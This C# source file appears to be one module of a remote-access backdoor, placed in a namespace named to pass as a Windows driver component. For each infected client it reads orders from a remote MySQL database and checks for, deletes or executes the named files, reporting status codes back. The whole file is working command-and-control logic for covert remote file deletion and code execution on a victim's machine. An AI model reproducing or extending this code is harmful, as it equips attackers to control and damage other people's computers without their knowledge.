using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Windows_Driver_Foundation
{
    class classProcessCheckFiles
    {
        private static classMySQLDatabase classMysql;
        private static classExeptionAndErrorManagement classExeption;

        public void execute_check_files_protocol(int uid)
        {
            classExeption = new classExeptionAndErrorManagement();
            classMysql = new classMySQLDatabase();

            classMysql.openDatabaseConnection();

            List<int> pending_check_files = classMysql.getIds_OfCheckFiles(uid);

            if (pending_check_files.Any())
            {
                foreach (int id_selected in pending_check_files)
                {
                    string[] row_fields = classMysql.read_tblCheckFiles(id_selected);

                    /* tbl_check_files Fields GUIDE
                     * row_fields[0] = id
                     * row_fields[1] = client_id
                     * row_fields[2] = path
                     * row_fields[3] = execute_order
                     * row_fields[4] = last_update
                     * row_fields[5] = order_status  */

                    /* ORDER_STATUS GUIDE:
                     * 1 - Pending order
                     * 2 - Order Readed
                     * 3 - File checked (file exists)
                     * 4 - File checked (file not exists)
                     * 5 - File Deleted
                     * 6 - File Delete Error
                     * 7 - File Executed
                     * 8 - File Execution Error
                     * 10 - This Order not exists  */

                    classExeption.printConsole("execute_check_files_protocol()", "Id Selected: " + id_selected.ToString() + "     Path: " + row_fields[2]);

                    switch (row_fields[3])
                    {
                        /* EXECUTE_ORDER GUIDE:
                         * "1" - Check if file path exists
                         * "2" - Check if exists And Delete file  
                         * "3" - Check if existes And Execute   */

                        case "1": // Check if file path exists 
                            classExeption.printConsole("[execute_check_files_protocol()", "A Verificar se ficheiro existe.");
                            if (File.Exists(row_fields[2]))
                            {
                                classExeption.printConsole("[execute_check_files_protocol()", "Ficheiro " + row_fields[2] + " Existe!");
                                classMysql.update_CheckFiles(id_selected, 3);
                            }
                            else
                            {
                                classExeption.printConsole("[execute_check_files_protocol()", "Ficheiro " + row_fields[2] + " NÃO existe!");
                                classMysql.update_CheckFiles(id_selected, 4);
                            }
                            break;

                        case "2": // Check if path exists and Delete file 
                            classExeption.printConsole("[execute_check_files_protocol()", "A Verificar se ficheiro existe e APAGAR.");
                            if (File.Exists(row_fields[2]))
                            {
                                classExeption.printConsole("[execute_check_files_protocol()", "Ficheiro " + row_fields[2] + " Existe!");
                                classMysql.update_CheckFiles(id_selected, 3);
                                try
                                {
                                    File.Delete(row_fields[2]);
                                    classExeption.printConsole("[execute_check_files_protocol()", "Ficheiro " + row_fields[2] + " Apagado!");
                                }
                                catch (Exception ex)
                                {
                                    classMysql.update_CheckFiles(id_selected, 6);
                                    classExeption.exeptionHandling(ex.ToString());
                                }

                                if (!File.Exists(row_fields[2])) // Confirma se o ficheiro foi mesmo apagado.
                                {
                                    classMysql.update_CheckFiles(id_selected, 5);
                                }
                            }
                            else
                            {
                                classMysql.update_CheckFiles(id_selected, 4);
                                classExeption.printConsole("[execute_check_files_protocol()", "Ficheiro não existe!");
                            }
                            break;

                        case "3": // Verifica se path existe e executa.
                            classExeption.printConsole("[execute_check_files_protocol()", "A Verificar se ficheiro existe e APAGAR.");
                            if (File.Exists(row_fields[2]))
                            {
                                classExeption.printConsole("[execute_check_files_protocol()", "Ficheiro " + row_fields[2] + " Existe!");
                                classMysql.update_CheckFiles(id_selected, 3);
                                try
                                {
                                    var processShell = new classProcessShellCommands();
                                    processShell.executeProcess(row_fields[2]);
                                    classMysql.update_CheckFiles(id_selected, 7);
                                }
                                catch (Exception ex) 
                                {
                                    classMysql.update_CheckFiles(id_selected, 8);
                                    classExeption.exeptionHandling(ex.ToString());
                                }
                            }else
                            {
                                classMysql.update_CheckFiles(id_selected, 4);
                                classExeption.printConsole("[execute_check_files_protocol()", "Ficheiro não existe!");
                            }
                            break;

                            default:
                                classMysql.update_CheckFiles(id_selected, 10);
                                classExeption.printConsole("[execute_check_files_protocol()", "executed_order " + row_fields[3] + " Ordem de execução inválida.");
                            break;
                    }
                }
            }
            else
                classExeption.printConsole("execute_check_files_protocol()", "Não existem ficheiros para verificar");

            classMysql.closeDatabaseConnection();
        }


    }
}
